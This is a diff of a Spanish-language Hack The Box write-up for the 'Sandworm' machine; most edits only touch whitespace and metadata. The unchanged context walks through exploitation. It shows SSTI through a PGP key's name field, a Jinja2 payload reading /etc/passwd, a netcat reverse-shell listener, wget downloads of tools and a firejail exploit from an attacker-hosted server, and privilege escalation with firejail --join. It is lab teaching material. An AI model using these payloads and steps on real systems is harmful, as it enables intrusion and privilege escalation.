@@ -1,14 +1,13 @@
 ---
 title: Sandworm - Hack the Box (htb)
-date: 2023-10-31 22:09:00 +0800
-categories: [Writeup, htb]
+date: 2023-11-01 14:09:00 +0800
+categories: [writeup, htb]
 tags: [htb,ctf,linux, hack the box,SSTI,firejail]
 pin: true
 math: true
 mermaid: true
 image:
   path: /writeup-htb-sandworm/sandworm_logo2.png
-  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
   alt: Sandworm
 ---
 
@@ -19,14 +18,14 @@ Primeramente iniciamos con el escaneo de puerto mediante la herramienta `nmap`.
 ```bash
 sudo nmap 10.10.11.218 -Pn -p- -n -sS -T4 -oN scan1 -vvv
 ```
-Como resultado se obtiene tres puertos abiertos los cuales son: el 22,80 y 443.
+Como resultado se obtiene tres puertos abiertos los cuales son: el 22,80 y 443.  
 ![Desktop View](/writeup-htb-sandworm/nmap1.png)
 _Nmap scan_
 Para obtener mayor información de estos puertos se utilizará el siguiente comando:
 ```bash
 nmap 10.10.11.218 -Pn -p 22,80,443 -sV -sC -oN scan2
 ```
-Como resultado se observa servicio de ssh en el puerto 22, en el puerto 80 un servicio http, en el cual hay una redirección a https://ssa.htb, por último tenemos el puerto 443 donde hay un servicio de ssl/http, que vendría a ser un sitio web seguro y por deducción corresponde a `https://ssa.htb`.
+Como resultado se observa servicio de ssh en el puerto 22, en el puerto 80 un servicio http, en el cual hay una redirección a https://ssa.htb, por último tenemos el puerto 443 donde hay un servicio de ssl/http, que vendría a ser un sitio web seguro y por deducción corresponde a `https://ssa.htb`.  
 ![Desktop View](/writeup-htb-sandworm/nmap2.png)
 _Nmap scan_
 
@@ -51,7 +50,7 @@ _Wfuzz_
 En `https://ssa.htb/admin` nos redirige a un login, en el cual se intentó diversos métodos para loguearse, sin embargo, no se tuvo éxito, por lo tanto, la vulnerabilidad debe estar en otro lugar.  
 ![Desktop View](/writeup-htb-sandworm/login.png)
 _Login_
-En `https://ssa.htb/guide` hay una demostración de la `encriptación PGP`, en el cual hay diferentes cuadros de texto para realizar funciones como desencriptar un mensaje, encriptar mensaje y verificar el signature.
+En `https://ssa.htb/guide` hay una demostración de la `encriptación PGP`, en el cual hay diferentes cuadros de texto para realizar funciones como desencriptar un mensaje, encriptar mensaje y verificar el signature.  
 ![Desktop View](/writeup-htb-sandworm/guide.png)
 _Guide_
 Justamente en verificar signature hay 2 cuadros de texto en los cuales podemos ingresar datos, uno es para la public key y el otro para el signed text. Como se puede ingresar los datos sin restricciones lo que vamos a hacer es generar una public key y también un signed text.  
@@ -64,7 +63,7 @@ Con esta información procedemos a generar nuestra pgp key.
 ```bash
 gpg --gen-key
 ```
-> El programa pedirá colocar un `real name` (colocar cualquier nombre), un `email` (colocar cualquier email) y también confirmar dichos datos para lo cual se debe digitar `o`. Por último pedirá digitar una `clave` (colocar una clave que les sea fácil de recordar)
+> El programa pedirá colocar un `real name` (colocar cualquier nombre), un `email` (colocar cualquier email) y también confirmar dichos datos para lo cual se debe digitar `o`. Por último pedirá digitar una `clave` (colocar una clave que les sea fácil de recordar).  
 {: .prompt-info }
 
 ![Desktop View](/writeup-htb-sandworm/gpg.png)
@@ -77,7 +76,7 @@ Ahora exportamos la public key.
 ```bash
 gpg -a -o public.key --export atlas
 ```
-> Donde public.key es el nombre como se exportará y atlas es el real name de la key generada anteriormente.
+> Donde public.key es el nombre como se exportará y atlas es el real name de la key generada anteriormente.  
 {: .prompt-info }
 
 ![Desktop View](/writeup-htb-sandworm/gpg public.png)
@@ -89,7 +88,7 @@ echo 'mensaje' | gpg --clear-sign
 > Donde mensaje es un texto al que le quiero realizar sign.
 {: .prompt-info }
 
-Esto da como resultado un PGP SIGNED.
+Esto da como resultado un PGP SIGNED.  
 ![Desktop View](/writeup-htb-sandworm/gpg sign.png)
 _Creación de Sign_
 Copiamos el public key y el PGP signed y lo pegamos en los cuadros de texto correspondientes de `https://ssa.htb/guide`, luego se ejecuta.
@@ -107,38 +106,38 @@ En el artículo [**SSTI (Server Side Template Injection)**](https://book.hacktri
 > Para este caso vamos a utilizar **\{\{7*7\}\}** para comprobar dicha vulnerabilidad.  
 
 Como hemos descubierto el real name es el parámetro que se inyecta, entonces vamos a colocar el valor de \{\{7*7\}\} como el real name.
-Bien vamos a generar nuestra key.
+Bien vamos a generar nuestra key.  
 ```bash
 gpg --gen-key
 ```
 ![Desktop View](/writeup-htb-sandworm/gpg2.png)
 _GPG_
-Luego exportamos la publick key de la key generada.
+Luego exportamos la publick key de la key generada.  
 ![Desktop View](/writeup-htb-sandworm/gpg public2.png)
 _Export public key_
-Generamos el signed text.
+Generamos el signed text.  
 ![Desktop View](/writeup-htb-sandworm/gpg sign2.png)
 _Creación de Sign_
 > Donde -u se utiliza para especificar el real name al cual le vamos a generar su sign. 
 {: .prompt-info }
 
-Copiamos la public key y el PGP signed, luego se ejecutó. Se obtuvo como resultado `49`, lo cual es el resultado de multiplicar 7\*7, por lo tanto, se comprueba que existe la vulnerabilidad de SSTI.
+Copiamos la public key y el PGP signed, luego se ejecutó. Se obtuvo como resultado `49`, lo cual es el resultado de multiplicar 7\*7, por lo tanto, se comprueba que existe la vulnerabilidad de SSTI.  
 ![Desktop View](/writeup-htb-sandworm/verification2.png)
 _Verification Signature_
-Ahora vamos a determinar el lenguaje que está detrás, y para ello nos apoyamos del siguiente mapa.
+Ahora vamos a determinar el lenguaje que está detrás, y para ello nos apoyamos del siguiente mapa.  
 ![Desktop View](/writeup-htb-sandworm/SSTI.png)
 _mapa SSTI_
 Como \{\{7\*7\}\} da un resultado exitoso, tenemos que probar \{\{7\*\'7\'\}\} y si se tiene éxito estaremos ante Jinja2 o Twig.
 Realizamos los pasos anteriores de generar una nueva key, exporta su public key y generar el PGP signed.
 > Utilizamos **\{\{7\*\'7\'\}\}** como el real name.
 
-Una vez verificada el signed, se obtiene como resultado `7777777`, por lo tanto, en el backend se utiliza `Jinja2` o `Twig`.
+Una vez verificada el signed, se obtiene como resultado `7777777`, por lo tanto, en el backend se utiliza `Jinja2` o `Twig`.  
 ![Desktop View](/writeup-htb-sandworm/verification3.png)
 _Verification Signature_
 En el siguiente repositorio de Github [**PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution) encontramos payloads de SSTI para Jinja2.
 > Utilizaremos el payload **\{\{ get_flashed_messages.\_\_globals\_\_.\_\_builtins\_\_.open(\"/etc/passwd\").read() \}\}** para leer el archivo `/etc/passwd`{: .filepath}.  
 
-Realizamos los pasos anteriores y obtenemos como resultado el contenido de  `/etc/passwd`{: .filepath}, por lo tanto la inyección ha sido un éxito.
+Realizamos los pasos anteriores y obtenemos como resultado el contenido de  `/etc/passwd`{: .filepath}, por lo tanto la inyección ha sido un éxito.  
 ![Desktop View](/writeup-htb-sandworm/verification4.png)
 _Verification Signature_
 ### Obtención de shell
@@ -155,7 +154,7 @@ Realizamos la generación de la key, exportación de la public key y el PGP sign
 ```bash
 nc -lvnp 3222
 ```
-Verificamos el signature y luego de unos segundos, obtenemos acceso a la shell del usuario `atlas`.
+Verificamos el signature y luego de unos segundos, obtenemos acceso a la shell del usuario `atlas`.  
 ![Desktop View](/writeup-htb-sandworm/user shell.png)
 _User shell_
 ## Obtener flag de usuario
@@ -172,7 +171,7 @@ _.config_
 En el contenido de este archivo podemos encontrar el `password` del usuario `silentobserver`.  
 ![Desktop View](/writeup-htb-sandworm/pass silent.png)
 _Password del usuario silentobserver_
-Por medio de `ssh` nos conectamos al usuario silentobserver.
+Por medio de `ssh` nos conectamos al usuario silentobserver.  
 ```bash
 ssh silentobserver@10.10.11.218 
 ```
@@ -198,7 +197,7 @@ Al listar los permisos del archivo firejail encontramos que el propietario es `r
 ![Desktop View](/writeup-htb-sandworm/ls firejail.png)
 _listar permisos del archivo_
 Del archivo `/etc/groups`{: .filepath} , obtenemos los usuarios que pertenecen al grupo jailer.   
-Donde el usuario `atlas` es integrante de este grupo.
+Donde el usuario `atlas` es integrante de este grupo.  
 ![Desktop View](/writeup-htb-sandworm/group.png)
 _grupo_
 Entonces para poder ejecutar el archivo firejail debemos de tener una shell del usuario `atlas`. La shell lo podemos obtener con lo visto anteriormente en el apartado de `Obtención de shell` o también se puede lograr por el siguiente método.
@@ -209,7 +208,7 @@ Antes de continuar quisiera explicarles respecto a la herramienta `pspy` y como 
 {: .prompt-info }
 De acuerdo al repositorio, debemos de descargar el archivo binario, luego enviarlo a la máquina víctima, darle permisos de ejecución y finalmente ejecutarlo.
 - Para enviar el archivo binario a la máquina víctima, lo podemos hacer de la siguiente manera.
-  + Iniciar un servidor web en nuestro máquina.
+  + Iniciar un servidor web en nuestro máquina.  
 ```bash
 python3 -m http.server 80
 ```
@@ -219,18 +218,18 @@ python3 -m http.server 80
 ```bash
 wget http://10.10.14.78/pspy64
 ```
-> Donde 10.10.14.78 es la ip de tu máquina.
+> Donde 10.10.14.78 es la ip de tu máquina.  
 {: .prompt-info }
   ![Desktop View](/writeup-htb-sandworm/pspy download.png)
   _Descargar archivo_
-- Dar permiso de ejecución.
+- Dar permiso de ejecución.  
 ```bash
 chmod +x pspy64
 ```
 ![Desktop View](/writeup-htb-sandworm/pspy permiso.png)
 _Dar permiso de ejecución_
   
-- Ejecutar el archivo.
+- Ejecutar el archivo.  
 ```bash
 ./pspy64
 ```
@@ -281,7 +280,7 @@ pub fn log(user: &str, query: &str, justification: &str) {
 }
 ```
 Reemplazamos la ip `10.10.14.67` por nuestra ip y el puerto `444`, lo cambiamos por el de nuestra preferencia.  
-Con `nano` editamos `/opt/crates/logger/src/lib.rs`{: .filepath} y colocamos el código anterior, cambiando `ip` y `puerto`.
+Con `nano` editamos `/opt/crates/logger/src/lib.rs`{: .filepath} y colocamos el código anterior, cambiando `ip` y `puerto`.  
 ![Desktop View](/writeup-htb-sandworm/mod lib.png)
 _Modificacion de lib.rs_
 Antes de guardar; en otra shell colocamos nuestro puerto en escucha.
@@ -292,7 +291,7 @@ Guardamos y luego de un tiempo tenemos acceso al usuario `atlas`.
 ![Desktop View](/writeup-htb-sandworm/shell atlas.png)
 _Puerto en escucha_
 ### Escalada de privilegios con firejail
-Con el acceso al usuario `atlas` ya podemos utilizar `firejail`. Listamos la versión de firejail y es la 0.9.68.
+Con el acceso al usuario `atlas` ya podemos utilizar `firejail`. Listamos la versión de firejail y es la 0.9.68.  
 ```bash
 firejail --version
 ```
@@ -303,7 +302,7 @@ Se buscó en google vulnerabilidades para esta versión de firejail y se encontr
 {: .prompt-info }
 Buscando en google se encontró la prueba de concepto([**PoC**](https://seclists.org/oss-sec/2022/q2/188)) para esta vulnerabilidad, como también más detalle de la vulnerabilidad.
 - Descargamos el exploit proporsionado y lo enviamos a la máquina víctima.
-  + Para enviar el exploit iniciamos un servidor web en nuestro máquina.
+  + Para enviar el exploit iniciamos un servidor web en nuestro máquina.  
 ```bash
 python3 -m http.server 80
 ```
@@ -318,13 +317,13 @@ wget http://10.10.14.78/firejoin_py.bin
    {: .prompt-info }
    ![Desktop View](/writeup-htb-sandworm/descarga firejail.png)
    _Descargar archivo_
-- Damos permiso de ejecución.
+- Damos permiso de ejecución.  
 ```bash
 chmod +x firejoin_py.bin
 ```
 ![Desktop View](/writeup-htb-sandworm/permiso firejail.png)
 _Permiso de ejecución_
-- Antes de ejecutar lo que vamos a hacer es actualizar nuestro shell, ya que si no lo actualizas no interpreta bien el exploit.
+- Antes de ejecutar lo que vamos a hacer es actualizar nuestro shell, ya que si no lo actualizas no interpreta bien el exploit.  
 ```bash
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
@@ -348,7 +347,7 @@ python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 ![Desktop View](/writeup-htb-sandworm/actualizacion shell.png)
 _Actualizar shell_
-- Colocamos ` firejail --join=54130`.    
+- Colocamos `firejail --join=54130`.    
 ```bash
 firejail --join=54130
 ```
